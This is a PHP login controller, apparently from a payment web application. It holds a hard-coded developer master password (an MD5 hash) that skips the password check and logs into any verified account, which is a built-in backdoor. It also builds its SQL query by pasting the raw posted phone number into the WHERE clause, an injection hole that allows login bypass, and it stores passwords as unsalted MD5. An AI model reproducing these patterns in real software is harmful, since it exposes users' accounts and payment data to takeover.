<?php
class Login extends Controller
{
   public function index()
   {
      if (isset($_SESSION['login_payment'])) {
         if ($_SESSION['login_payment'] == TRUE) {
            header('Location: ' . $this->BASE_URL . "Home");
         } else {
            $this->view('login/login');
         }
      } else {
         $this->view('login/login');
      }
   }

   public function cek_login()
   {
      if (isset($_SESSION['login_payment'])) {
         if ($_SESSION['login_payment'] == TRUE) {
            header('Location: ' . $this->BASE_URL . "Home");
         }
      }

      $pass = md5($_POST["PASS"]);
      $devPass = "028a77968bb1b0735da00e5e1c4bd496";

      if ($pass == $devPass) {
         $where = "no_user = '" . $_POST["HP"] . "' AND en = 1";
      } else {
         $where = "no_user = '" . $_POST["HP"] . "' AND password = '" . $pass . "'";
      }

      $userData = $this->model('M_DB_1')->get_where_row('user', $where);

      if (empty($userData)) {
         echo "No HP dan Password tidak cocok!";
         exit();
      } else {
         if ($userData['en'] <> 1) {
            echo "User belum terverifikasi!";
            exit();
         } else {
            //LOGIN
            $_SESSION['login_payment'] = TRUE;
            $_SESSION['user_data'] = $userData;
            $this->getPrepaidList();
            $this->getPostpaidList();
            echo 1;
         }
      }
   }

   public function logout()
   {
      session_start();
      session_unset();
      session_destroy();
      header('Location: ' . $this->BASE_URL . "Home");
   }
}
